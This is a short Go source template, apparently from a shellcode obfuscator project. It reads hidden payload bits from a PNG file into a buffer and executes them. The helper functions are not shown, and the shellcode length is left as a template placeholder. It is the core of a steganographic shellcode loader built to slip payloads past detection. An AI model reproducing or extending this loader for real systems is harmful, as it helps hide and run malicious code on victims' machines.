package main

const image_source = "C:/Users/Blackberry/Desktop/projects/yet-another-shellcode-obfuscator/samples/helpme_x64.png"
const shellcode_len = {{ MAX_BITS }}


func main() {
    var payload_data [shellcode_len / 8]byte
    var image = get_image(image_source)
	read_image(image, payload_data)
	run(payload_data)
}
